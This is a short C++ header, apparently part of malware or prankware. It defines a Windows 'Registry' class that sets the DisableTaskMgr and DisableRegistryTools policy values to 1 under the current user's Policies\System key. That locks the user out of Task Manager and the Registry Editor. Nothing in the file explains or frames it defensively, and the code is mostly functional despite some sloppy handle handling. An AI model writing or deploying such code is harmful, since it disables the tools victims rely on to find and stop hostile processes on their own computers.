#pragma once
#include <iostream>
#include <Windows.h>

#define WIN32_LEAN_AND_MEAN
#pragma warning(disable:4129)
typedef long _L32;

class Registry {
private:
	
	LPCWSTR DisableTaskMgr = L"DisableTaskMgr";
	LPCWSTR DisableReg = L"DisableRegistryTools";
	HKEY hKey = HKEY_CURRENT_USER;
	LPCWSTR TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\");
	DWORD val_disable = 1;
	DWORD val_enable = 0;

public:

	void ProcessValue()
	{
		_L32 mgrResult = RegQueryValueExW(hKey, DisableTaskMgr, NULL, NULL, NULL, NULL);
		_L32 regResult = RegQueryValueExW(hKey, DisableReg, NULL, NULL, NULL, NULL);

		if (mgrResult == ERROR_FILE_NOT_FOUND && regResult == ERROR_FILE_NOT_FOUND)
		{

			if (RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
			{
				return;
			}
			else if (RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
			{
				return;
			}
			else
			{
				RegCloseKey(hKey);
			}
		}
		else
		{
			RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
			RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
			RegCloseKey(hKey);
		}
		RegCloseKey(hKey);
	}
	void ModifyRegistry()
	{
		RegOpenKeyExW(hKey, TMGR_PATH, 0, KEY_ALL_ACCESS, &hKey);

		if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		{
			TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\");
			ProcessValue();
		}
		else
		{
			ProcessValue();
		}
		return;
	}

};